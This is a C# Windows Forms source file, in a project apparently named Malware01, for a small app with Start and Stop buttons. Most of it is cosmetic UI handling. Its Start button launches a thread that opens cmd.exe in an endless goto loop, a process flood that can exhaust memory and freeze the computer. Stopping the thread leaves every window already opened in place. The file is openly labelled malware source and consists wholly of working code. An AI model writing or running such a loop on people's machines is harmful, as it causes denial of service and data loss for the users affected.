using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;

namespace Malware01
{
    public partial class Menu : Form
    {

        static Thread StartCmd { get; set; }

        //Start all and make the txt_Processes color be the dark green one.
        public Menu()
        {
            InitializeComponent();
            txt_Processes.ForeColor = Color.DarkGreen;
        }

        //Useless
        private void label1_Click(object sender, EventArgs e) { }

        //Useless
        private void Menu_Load(object sender, EventArgs e) { }

        //Change the fore color to blue while the mouse is on the button.
        private void bt_Start_MouseHover(object sender, EventArgs e)
        {
            bt_Start.ForeColor = Color.Blue;
        }

        //Change the fore color to black again.
        private void bt_Start_MouseLeave(object sender, EventArgs e)
        {
            bt_Start.ForeColor = Color.Black;
        }

        //Change the fore color to blue while the mouse is on the button.
        private void bt_Stop_MouseHover(object sender, EventArgs e)
        {
            bt_Stop.ForeColor = Color.Blue;
        }

        //Useless.
        private void bt_Stop_MouseDown(object sender, MouseEventArgs e) { }

        //Change the fore color to black again.
        private void bt_Stop_MouseLeave(object sender, EventArgs e)
        {
            bt_Stop.ForeColor = Color.Black;
        }

        //Useless.
        private void bt_Stop_Paint(object sender, PaintEventArgs e) { }

        //Start cmds forever.
        void StartCMD()
        {
        StartCMD:;
            Process.Start("cmd.exe");
            goto StartCMD;
        }

        //Make a thead Start cmds forever and print in txt_Processes "Status: Cmd Started!" forever to.
        private void bt_Start_Click(object sender, EventArgs e)
        {
            StartCmd = new Thread(StartCMD);
            StartCmd.Start();

            if (StartCmd.IsAlive)
            {
                txt_Processes.Text += "Status: Cmd Started!\n";
            }
        }

        //Stop that thread.
        private void bt_Stop_Click(object sender, EventArgs e)
        {
            StartCmd.Abort();
        }
    }
}
